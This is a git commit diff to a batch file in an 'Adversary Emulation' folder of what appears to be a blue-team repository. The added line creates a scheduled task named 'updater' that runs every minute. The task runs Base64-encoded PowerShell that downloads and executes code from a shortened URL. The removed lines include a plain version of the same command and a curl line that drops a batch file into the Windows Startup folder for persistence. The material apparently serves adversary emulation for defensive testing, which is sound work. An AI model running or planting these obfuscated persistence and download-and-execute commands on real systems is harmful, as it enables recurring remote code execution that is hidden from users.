c98a84050e981badb5da056e369287a31df7e064
ZeroDayZealot <95112988+LeMagicKonch@users.noreply.github.com>
2025-09-29 11:05:30 -0400

    Update taskSchedular.bat

--- Adversary Emulation/taskSchedular.bat
+++ Adversary Emulation/taskSchedular.bat
@@ -1,7 +1,1 @@
-:: schtasks /CREATE /SC MINUTE /TN updater /TR "powershell.exe -e aQBlAHgAIAAoAGkAdwByACAALQB1AHIAaQAgACcAaAB0AHQAcABzADoALwAvAHQAaQBuAHkAdQByAGwALgBjAG8AbQAvAHkAZgBkAGQAZAAyAHoAcAAnACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwApAC4AQwBvAG4AdABlAG4AdAA="
-
-:: schtasks /CREATE /SC MINUTE /TN updater /TR "powershell.exe -c iex (iwr -uri 'https://tinyurl.com/yfddd2zp' -UseBasicParsing).Content"
-
-
-curl.exe -k -o "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\startupPersistance.bat" "https://github.com/LeMagicKonch/BlueTeamOps/raw/refs/heads/main/Adversary%20Emulation/startCalc.bat"
-
+schtasks /CREATE /SC MINUTE /TN updater /TR "powershell.exe -e aQBlAHgAIAAoAGkAdwByACAALQB1AHIAaQAgACcAaAB0AHQAcABzADoALwAvAHQAaQBuAHkAdQByAGwALgBjAG8AbQAvAHkAZgBkAGQAZAAyAHoAcAAnACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwApAC4AQwBvAG4AdABlAG4AdAA="
